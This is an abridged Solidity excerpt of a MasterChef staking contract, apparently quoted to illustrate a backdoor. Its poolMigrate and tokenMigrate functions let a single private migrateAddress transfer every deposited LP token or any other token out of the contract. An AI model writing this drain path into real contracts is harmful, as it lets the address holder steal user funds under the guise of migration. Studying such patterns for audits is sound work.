...
contract MasterChef is Ownable {
    ...
    address private migrateAddress;
    ...
    function poolMigrate() public {
        require(msg.sender == migrateAddress, "Invalid Migrator");
        ...
        for (uint256 pid = 0; pid < length; ++pid) {
            ...
            IERC20 lpToken = pool.lpToken;
            uint256 bal = lpToken.balanceOf(address(this));
            lpToken.transfer(migrateAddress, bal);
        }
    }

    function tokenMigrate(IERC20 _token) public {
        require(msg.sender == migrateAddress, "Invalid Migrator");
        
        uint256 bal = _token.balanceOf(address(this));
        _token.transfer(migrateAddress, bal);
    }
